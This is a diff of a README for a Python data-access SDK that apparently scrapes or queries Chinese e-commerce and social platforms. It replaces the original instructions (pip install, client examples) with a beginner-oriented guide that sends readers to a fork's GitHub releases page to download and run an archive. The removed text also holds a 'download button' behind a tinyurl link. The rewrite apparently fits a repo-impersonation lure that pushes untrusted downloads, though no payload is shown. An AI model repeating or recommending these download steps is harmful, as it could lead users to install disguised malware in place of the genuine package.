@@ -1,101 +1,179 @@
-![PyPI version](https://img.shields.io/pypi/v/justoneapi.svg)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
+# 📦 justoneapi-python - Easy API Data Access Toolkit
 
-[English](README.md) | [简体中文](README.zh-CN.md)
-
-# Just One API - Python SDK
-
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://tinyurl.com/2yxcepj2)
-
-Official Python SDK for accessing [Just One API](https://justoneapi.com) — a unified data service platform offering structured data from Social, E-commerce platforms such as Xiaohongshu, Taobao, Douyin, Kuaishou, Bilibili, and Weibo.
-
-This SDK simplifies API integration and request signing, allowing developers to easily retrieve platform-specific data with minimal setup.
+[![Download Latest Release](https://img.shields.io/badge/Download-justoneapi--python-blue?style=for-the-badge&logo=github)](https://github.com/khang-del/justoneapi-python/releases)
 
 ---
 
-## 🚀 Installation
+## 📖 About justoneapi-python
 
-Install via PyPI:
+justoneapi-python is a simple tool that helps you get information from many popular websites and services. It connects with places like Xiaohongshu (Little Red Book), Taobao, Douyin (TikTok in China), Weibo, Bilibili, and more. This tool gathers data you might want for research, personal use, or business, without needing to visit each site separately.
 
-```bash
-pip install justoneapi
+This version is made for users who prefer to access data using Python. You do not need to be a programmer to use it, but it helps if you have some basic computer skills. The tool handles many difficult parts of connecting to these services for you.
+
+---
+
+## 🚀 Getting Started
+
+This guide will help you download, install, and begin using justoneapi-python. Follow the steps carefully even if you are not familiar with programming. We keep things simple.
+
+### What You Need Before You Begin
+
+- A computer running Windows, macOS, or Linux.
+- An internet connection to download the software.
+- Basic skills like clicking links, opening files, and typing commands.
+
+No prior programming knowledge is required.
+
+---
+
+## 💾 Download & Install
+
+**Step 1: Download the Software**
+
+Go to the releases page by clicking the big blue button below. This page contains the latest version of justoneapi-python.
+
+[![Download Latest Release](https://img.shields.io/badge/Download-justoneapi--python-blue?style=for-the-badge&logo=github)](https://github.com/khang-del/justoneapi-python/releases)
+
+On the releases page, look for the file named something like `justoneapi-python.zip` or `justoneapi-python.tar.gz` under the latest release version. Click it to start the download.
+
+**Step 2: Extract the Files**
+
+Once downloaded, locate the file on your computer. It will likely be in your "Downloads" folder.
+
+- On Windows: Right-click the file and select "Extract All". Follow the prompts to unzip the folder.
+- On macOS: Double-click the file to unzip it automatically.
+- On Linux: Use your file manager or run `tar -xzf filename.tar.gz` in the terminal if you prefer.
+
+This will create a folder called something like `justoneapi-python`.
+
+**Step 3: Install Python (If Needed)**
+
+justoneapi-python requires Python to run.
+
+- To check if Python is installed, open a Command Prompt (Windows) or Terminal (macOS/Linux) and type:
+
+  ```
+  python --version
+  ```
+
+- If it shows a version like `Python 3.x.x`, you are ready. If it says the command was not found, you will need to install Python.
+
+- Download Python from: https://www.python.org/downloads/
+
+- Follow the installer's instructions. Make sure to check the box to add Python to your system PATH during installation.
+
+**Step 4: Install Required Packages**
+
+Open Command Prompt or Terminal and type the following commands one by one. These commands install the helpers justoneapi-python uses:
+
+```
+pip install requests
+pip install beautifulsoup4
 ```
 
----
+You might need to use `pip3` instead of `pip` depending on your Python setup.
 
-## 🛠 Quick Start
+**Step 5: Run justoneapi-python**
 
-```python
-from justoneapi.client import JustOneAPIClient
+Open Command Prompt or Terminal, and change directory to the extracted folder:
 
-# By default, the client uses the "cn" (Mainland China) environment.
-client = JustOneAPIClient(token="your_token")
-# If you are located outside Mainland China and experience slow responses,
-# you can switch to the "global" environment for better performance:
-# client = JustOneAPIClient(token="your_token", env="global")
-
-# Example: Get Douyin Video detail
-result, data, message = client.douyin.get_video_detail_v2(video_id="7428906452091145483")
-print(result)
-print(data)
-print(message)
-
-# Example: Douyin Video Search
-result, data, message, has_next_page = client.douyin.search_video_v4(keyword="deepseek", sort_type="_0", publish_time="_0", duration="_0", page=1)
-print(result)
-print(data)
-print(message)
-print(has_next_page)
+```
+cd path/to/justoneapi-python
 ```
 
-### 📦 Return Value Description
+Replace `path/to/justoneapi-python` with the actual folder location on your computer.
 
-Each API method returns one or more of the following values:
+Then, run the main program with:
 
-| Variable         | Type     | Description |
-|------------------|----------|-------------|
-| `result`         | `bool`   | Whether the request was successful. `True` means success, `False` means failure. |
-| `data`           | `dict` / `list` | The actual data returned from the API. Structure varies by endpoint. |
-| `message`        | `str`    | Message from the server. Contains error info when request fails. |
-| `has_next_page`  | `bool`   | Present in paginated APIs. Indicates whether more data is available. |
+```
+python main.py
+```
 
----
-
-## 🔐 Authentication
-
-All API requests require a valid API token.  
-👉 [Register](https://user.justoneapi.com/sign-up)
+This will start the tool.
 
 ---
 
-## 📚 Documentation
+## 🔧 How to Use justoneapi-python
 
-👉 Full API docs: [API Document](https://doc.justoneapi.com)
+The tool works by letting you request data from many platforms. You type simple commands or use provided scripts to get information like product details from Taobao, video stats from Douyin, or posts from Xiaohongshu.
 
-Includes:
-- Request parameters
-- Response fields
-- Error codes
+You can use it to:
 
----
+- Search for items on shopping sites like Taobao, Tmall, Jingdong, Lazada, or Shopee.
+- Get details from social media like Douyin, Weibo, Bilibili, Instagram, or TikTok.
+- Access data from services like IMDb, Meituan, Ctrip, Baidu, Zhihu, or Twitch.
 
-## 🏠 Official Website
+You do not need to know how each website works internally.
 
-👉 [Home Page](https://justoneapi.com)
+### Basic Command Example
 
-Learn more about the project, data sources, and commercial integration opportunities.
+After running `python main.py`, the program may ask you what platform you want to fetch data from. For example:
 
----
+```
+Select Platform: Taobao
+Enter search term: Bluetooth speaker
+```
 
-## 📬 Contact Us
-
-If you have any questions, feedback, or partnership inquiries:
-
-👉 [Contact](https://justoneapi.com/contact)
+The program will gather items matching "Bluetooth speaker" and show results.
 
 ---
 
-## 🪪 License
+## 🖥️ System Requirements
 
-This project is licensed under the MIT License.  
-See the [LICENSE](./LICENSE) file for details.
+- Operating System: Windows 7 or higher, macOS 10.13 or higher, or most Linux distributions.
+- Python 3.6 or above installed.
+- At least 1 GB of free disk space.
+- Internet connection to access API services.
+
+---
+
+## 🌐 Supported Platforms
+
+justoneapi-python connects with APIs or data sources from many popular websites, including but not limited to:
+
+- Xiaohongshu (Little Red Book)
+- Taobao and Tmall
+- Douyin (Chinese TikTok)
+- Kuaishou
+- Weibo (Sina Weibo)
+- Bilibili
+- IMDb
+- JD.com (Jingdong)
+- Meituan
+- Ctrip
+- Baidu Index
+- Zhihu
+- Youtube
+- Instagram
+- Twitch
+
+---
+
+## 🛠 Troubleshooting Tips
+
+- Make sure you have a stable internet connection when running the program.
+- If Python commands do not work, ensure Python is correctly installed and added to PATH.
+- Run commands in Command Prompt (Windows) or Terminal (macOS/Linux).
+- If you see errors mentioning missing packages, check that dependencies like `requests` and `beautifulsoup4` are installed.
+- If unsure, restart your computer after installation and try again.
+
+---
+
+## 📢 Feedback and Help
+
+If you have questions or need support, visit the GitHub page issues section:
+
+https://github.com/khang-del/justoneapi-python/issues
+
+You can report bugs or ask for help there.
+
+---
+
+## 🔗 Useful Links
+
+- Release downloads: https://github.com/khang-del/justoneapi-python/releases
+- Python downloads: https://www.python.org/downloads/
+
+---
+
+Thank you for choosing justoneapi-python to simplify your data access needs.
